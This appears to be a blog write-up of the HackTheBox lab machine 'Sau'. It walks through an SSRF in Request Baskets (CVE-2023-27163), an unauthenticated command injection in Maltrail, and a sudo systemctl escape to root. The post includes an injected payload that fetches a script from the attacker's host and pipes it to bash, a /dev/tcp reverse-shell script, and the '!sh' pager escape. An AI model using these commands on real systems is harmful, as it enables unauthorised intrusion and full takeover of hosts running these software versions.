---
layout: post
title: HackTheBox-Sau Walkthrough
date: 2023-12-29 08:00:00 -500
categories: [HackTheBox Walkthrough]
tags: [HackTheBox]
image:
  path: /assets/img/headers/Sau.webp
---

# Description :
Sau is an easy Hack The Box machine that features two vulnerabilities on its website—SSRF on the main site and OS Command Injection in a locally running website named Maltrail on port 80. The privilege escalation to root is straightforward, as the Puma user can execute a service with root privileges.



## Nmap :

Upon scanning the host's ports, we identified two open ports: 22 and 5555 : 

```bash
 /opt/nmapAutomator/nmapAutomator.sh -t All -H 10.10.11.224 

Running all scans on 10.10.11.224

Host is likely running Linux


---------------------Starting Port Scan-----------------------



PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown



---------------------Starting Script Scan-----------------------



PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 29 Dec 2023 13:52:51 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 29 Dec 2023 13:52:24 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 29 Dec 2023 13:52:24 GMT
|_    Content-Length: 0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## TCP - PORT 5555

***About Request Baskets :Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI. It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.***

We can create a basket with name choice , in this case `emsec` :
![Alt text](/assets/img/posts/htb-sau/web_basket_01.png)
![Alt text](/assets/img/posts/htb-sau/web_basket_02.png)

![Alt text](/assets/img/posts/htb-sau/web_basket_03.png)

Now, our basket is prepared and awaits incoming requests:

![Alt text](/assets/img/posts/htb-sau/web_basket_04.png)

if we try to send requests to http://10.10.11.224:55555/emsec it will apear on `Request Baskets` :

![Alt text](/assets/img/posts/htb-sau/web_basket_05.png)

also there is a parameters that we can modify :

![Alt text](/assets/img/posts/htb-sau/web_basket_06.png)



## CVE-2023-27163 | SSRF:

By examining the website version

![Alt text](/assets/img/posts/htb-sau/vulnerable_version.png)

I searched on Google for vulnerabilities in the `request-baskets  Version: 1.2.1` and discovered the associated steps on GitHub under[CVE-2023-27163 ](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)

Having identified the SSRF on the website, by implementing this modification, we can exploit it.

![Alt text](/assets/img/posts/htb-sau/web_basket_07.png)

revisiting the `/emsec` basket :
![Alt text](/assets/img/posts/htb-sau/web_basket_08.png)

We successfully exploited the SSRF; it is now functioning as intended.


## OS Command Injection on Maltrail :


***what is Maltrail : [Maltrail](https://github.com/stamparm/maltrail/blob/master/README.md#introduction) is a malicious traffic detection system***

Upon inspecting the bottom, we can identify the version of Maltrail. After searching for its vulnerability on Google, we came across a post regarding [Unauthenticated OS Command Injection](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/).

Now, let's proceed. Firstly, change the `Forward URL:` to `http://127.0.0.1:80/login`:

![Alt text](/assets/img/posts/htb-sau/web_basket_09.png)

After executing the injection, we received the callback, confirming the successful functioning of the OS command :

![Alt text](/assets/img/posts/htb-sau/shell.png)

## Shell as puma:

create your reversesehll and strat the http.server: 

* reverse shell :
  
```bash
┌──(emsec㉿emsec-pc)-[~]
└─$ cat shell.sh 
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.81/4444 0>&1"
```

* payload :

```bash
curl -X POST 'http://10.10.11.224:55555/emsec' \
  --data "username=;'curl http://10.10.14.81/shell.sh|bash'"
```

* Upgrading Shell to Fully Interactive TTYs :

```bash
export TERM=xterm
python3 -c "import pty;pty.spawn('/bin/bash')"

CTR+Z

stty -echo raw;fg

```

and then reading the user falg :

```bash
puma@sau:/opt/maltrail$ cd /home/puma/
puma@sau:~$ ls
user.txt
puma@sau:~$ cat user.txt 
d19b35b25e4df14c10326b***********
```

## Shell as root :


Upon inspecting the privileges of the current Puma user using `sudo -l`, we discovered the capability to execute `/usr/bin/systemctl status trail.service` with root permissions.

```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```


It appears to be a straightforward privilege escalation. We can easily chack [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#sudo)

![Alt text](/assets/img/posts/htb-sau/gtfobins.png)



Get root by just running

`sudo /usr/bin/systemctl status trail.service` then `!sh`

![Alt text](/assets/img/posts/htb-sau/root.png)


I hope you enjoyed my write-up. 

Happy hacking!

